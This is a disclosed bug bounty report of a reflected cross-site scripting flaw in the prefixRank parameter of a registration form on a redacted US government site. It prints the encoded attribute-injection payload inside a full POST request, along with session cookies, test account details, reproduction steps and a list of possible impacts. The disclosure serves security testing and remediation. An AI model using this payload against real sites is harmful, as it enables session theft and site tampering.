# reflected xss in www.████████.gov

## Report Details
- **Report ID**: 1814335
- **URL**: https://hackerone.com/reports/1814335
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-12-21T12:50:26.639Z
- **Disclosed**: 2023-01-27T18:37:56.279Z

## Reporter
- **Username**: maskedpersian
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
It was observed that the application is vulnerable to cross-site scripting (XSS). XSS is a type of attack that involves running a malicious scripts on a victim’s browser.
poc attached
payload: ryp3i%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2fopk15
Parameter: prefixRank
request:
```
POST /ioss/site/customer.cfm?oHvIaPEiVgj7Hf9Ux5T+eNZwuEg2J/n12v1EZMCIm2I= HTTP/1.1
Host: www.████.gov
Cookie: CFID=37933027; CFTOKEN=51767030; JSESSIONID=1A3418B42833E571ACD8B2EA991592C4.cfusion; __utma=90160643.185474856.1671578010.1671578010.1671578010.1; __utmc=90160643; __utmz=90160643.1671578010.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt_GSA_CP=1; __utmb=90160643.10.10.1671578010
Content-Length: 628
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://www.██████████.gov
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.█████████.gov/ioss/site/customer.cfm?M8LgLru4s3ED7nBcLICmmmePvRA/+vXyGWDMaEFgwajcrt1aH3tfpVSr8pUuzMfeeJrg2zmmBIsdNqSXGXhXtg==
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Connection: close

prefixRank=ryp3i%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2fopk15&firstName=asdasd&middleName=ads&lastName=dez&affiliationID=1&level1=2&level3=&ORGNAME=Department+of+Agriculture&company=dez&address1=deaxsxas&address2=asda&city=asdas&state=OT&zip=3423423423&country=Anguilla&email=dezprogrammer%40gmail.com&dayPhone1=910&dayPhone2=648&dayPhone3=7750&dayPhone4=122&fax1=501&fax2=234&fax3=2343&orgID=&customerID=0&shipID=&passwordMetRequirements=False&passwordStrength=Very+Strong&pwChangeReqd=true&pw_minChars=14&pw_minUCase=2&pw_minLCase=2&pw_minNums=2&pw_minSymb=2&password=Salam123456789%40%40%40&passwordTxt=&mask=1&password2=Salam123456789%40%40%40&q1=1&a1=dez&q2=2&a2=dez
```

## Impact

Cookie Stealing - A malicious user can steal cookies and use them to gain access to the application.
Arbitrary requests - An attacker can use XSS to send requests that appear to be from the victim to the web server.
Malware download - XSS can prompt the user to download malware. Since the prompt looks like a legitimate request from the
site, the user may be more likely to trust the request and actually install the malware.
Defacement - attacker can deface the website usig javascript code.

## System Host(s)
████.gov

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1-register once 
2-if you try one more time  , you will receive "this email address already exists in the system "
3-now inject payload 
poc video attached

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
